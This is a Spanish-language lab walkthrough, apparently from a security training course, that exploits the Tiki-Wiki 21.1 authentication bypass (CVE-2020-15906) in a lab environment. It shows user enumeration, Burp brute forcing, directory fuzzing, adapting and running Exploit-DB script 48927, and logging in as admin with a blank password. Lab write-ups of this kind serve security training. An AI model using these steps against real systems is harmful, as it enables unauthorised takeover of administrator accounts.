
# Account Lockout Bypass

## <mark style="color:$primary;">Lab -</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**Tiki-Wiki Auth Bypass**</mark>

En 2020, se descubrió una vulnerabilidad de alto riesgo en el CMS Tiki-Wiki. La versión de Tiki-Wiki anterior a la 21.2 es vulnerable a una vulnerabilidad de omisión de autenticación que permite establecer una contraseña en blanco para el usuario administrador después de 50 intentos de inicio de sesión fallidos.

El identificador CVE asignado a esta vulnerabilidad es **CVE-2020-15906** . La puntuación base de gravedad de esta vulnerabilidad es **de 9,8** , lo que se considera crítico.

**Leer más:**

{% embed url="<https://nvd.nist.gov/vuln/detail/CVE-2020-15906>" %}

***

En este entorno de laboratorio, el usuario tendrá acceso a una instancia de Kali GUI. En el servidor objetivo se ejecuta un CMS Tiki-Wiki vulnerable a una vulnerabilidad de Auth Bypass, identificada como `CVE-2020-15906`. Se puede acceder a él utilizando las herramientas instaladas en Kali en <http://demo.ine.local>

Tu tarea consiste en obtener el footprint del CMS Tiki-Wiki utilizando las herramientas disponibles en la máquina Kali. Luego, explotarlo mediante el método apropiado.

La configuración se basa en: [vulhub](https://github.com/vulhub/vulhub/tree/master/tikiwiki/CVE-2020-15906)

**Objetivo:** Explotar el CMS Tiki-Wiki utilizando Burp y otras herramientas para acceder al panel de control de administración.

<figure><img src="/files/oaOBeSIAbdthIu02bY1p" alt=""><figcaption></figcaption></figure>

### Tiki Login

<figure><img src="/files/5q9t2eHoRX9AFvjHi8WC" alt=""><figcaption></figcaption></figure>

En el código fuente encontramos la página de login dedicada /tiki-login.php:

```html
<form name="loginbox" class="form" id="loginbox-1" action="http://demo.ine.local/tiki-login.php"
				method="post" 
						>
		<input type="hidden" class="ticket" name="ticket" value="hL19En2g1Qyfd9LkqFnC812i6JWdrzxOHSRwSekSj9w" />
```

Y al acceder nos redirige a `http://demo.ine.local/tiki-login_scr.php`

<figure><img src="/files/9XJ8qBUDTNAA3PwLpQls" alt=""><figcaption></figcaption></figure>

### Forgot Password

Si pulsamos en `I forgot my password`, llegamos a la página de reuperación de contraseña, en la que debemos introducir un usuario o un email:

<figure><img src="/files/NW2VgWoRnj9prOhjL5TJ" alt=""><figcaption></figcaption></figure>

### Enumeración de usuarios

Si probamos a poner el usuario admin nos dice no se puede enviar el mail de recuperación porque el usuario no ha configurado el email:

<figure><img src="/files/HzYphIsBqOKGipqxHQD9" alt=""><figcaption></figcaption></figure>

Pero si introducimos un usuario que no existe nos da el error: `Invalid or unknown username: xxx`

<figure><img src="/files/IDGAKuKbU3jtgI5OzHg7" alt=""><figcaption></figcaption></figure>

### BurpSuite

Capturamosun login con BurpSuite y observamos varias cookies cómo PHPSESSID y cómo se envían los datos, incuyendo un ID del ticket:

<figure><img src="/files/gT0R64uZUQp89gW6CShQ" alt=""><figcaption></figcaption></figure>

### Brute force - Intruder

Click derecho > Send to Intruder > Seleccionar password como payload position

<figure><img src="/files/U9JKaOVexQKhWmT8EsEg" alt=""><figcaption></figcaption></figure>

En Payloads cargamos una wordlist e iniciamos el ataque:

<figure><img src="/files/ib1F39lcgPNlfliA0DpQ" alt=""><figcaption></figcaption></figure>

En el Length `10624`, observamos que en la respuesta da error y requiere aprobación del administrador:

<figure><img src="/files/SOqveKVmcCc1ez5XlxWj" alt=""><figcaption></figcaption></figure>

Pero en el Length `6958` encontramos una posible contraseña válida, ya que se loguea correctamente:

<figure><img src="/files/iLAl9LabidqjSqOvyTxr" alt=""><figcaption></figcaption></figure>

Aunque al probar el login parece que de igual manera se bloquea:

<figure><img src="/files/xYKWOHnnb8JyZjZB8bdN" alt=""><figcaption></figcaption></figure>

### Enumeración Web

Realizamos fuzzing y descubrimos un archivo `changelog.txt` que contiene la versión de TikiWiki:

```bash
root@INE:~# dirsearch -u http://demo.ine.local -X 403,404

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                
                                                                                                                                                       
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/demo.ine.local/_26-05-16_15-47-09.txt

Error Log: /root/.dirsearch/logs/errors-26-05-16_15-47-09.log

Target: http://demo.ine.local/

[15:47:09] Starting: 
[15:47:10] 200 -   44KB - /.editorconfig                                   
[15:47:10] 200 -   10KB - /.gitlab-ci.yml                                  
[15:47:10] 200 -  353KB - /.gitattributes                                  
[15:47:13] 200 -    3KB - /INSTALL                                          
[15:47:13] 200 -    1KB - /README                                           
[15:47:14] 302 -    0B  - /about.php  ->  index.php
[15:47:20] 200 -    2KB - /changelog.txt                                    
[15:47:22] 200 -    0B  - /cron.php 
[15:47:27] 200 -   24KB - /license.txt  
[15:47:31] 200 -    2KB - /phpunit.xml.dist                                 
[15:47:33] 200 -    3KB - /robots.txt  
<----SNIP---->
```

Concretamente observamos que tiene la versión `21.1`

<figure><img src="/files/lh8aI3qLzaLT5H43hlTR" alt=""><figcaption></figcaption></figure>

### Búsqueda de exploits

Encontramos varios exploits relacionados con `tikiwiki 21.1`, como el de Authentication Bypass:

<figure><img src="/files/z7oA57HjuFtS6NsOjGqv" alt=""><figcaption></figcaption></figure>

{% embed url="<https://www.exploit-db.com/exploits/48927>" %}

Y con searchsploit:

```bash
root@INE:~# searchsploit tiki wiki 21.1
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
Tiki Wiki CMS Groupware 21.1 - Authentication Bypass               | php/webapps/48927.py
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Nos descargamos el exploit:

```bash
root@INE:~# searchsploit -m 48927
  Exploit: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/48927
     Path: /usr/share/exploitdb/exploits/php/webapps/48927.py
File Type: Python script, Unicode text, UTF-8 text executable

Copied to: /root/48927.py
```

Necesitamos modificar el exploit para cambiar la ruta del login:

```bash
rhost = sys.argv[1]
    url = "http://"+rhost+"/tiki/tiki-login.php"
```

a

```bash
rhost = sys.argv[1]
    url = "http://"+rhost+"/tiki-login.php"
```

Y ejecutamos el exploit:

```bash
root@INE:~# python3 48927.py 10.2.27.252

Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password 
Admin Password got removed.
Use BurpSuite to login into admin without a password
```

El exploit nos indica que debemos usar BurpSuite para loguearnos como admin sin contraseña.

### Bypass - Empty Password

Modificamos el request con BurpSuite y eliminamos la contraseña dejándola vacía:

<figure><img src="/files/JnWOI05FAdUuMX0CQf8f" alt=""><figcaption></figcaption></figure>

Al hacer forward observamos que conseguimos acceder sin problema y ya estas dentro!

<figure><img src="/files/bbAZ9AU9RUL5kR8JuGtl" alt=""><figcaption></figcaption></figure>
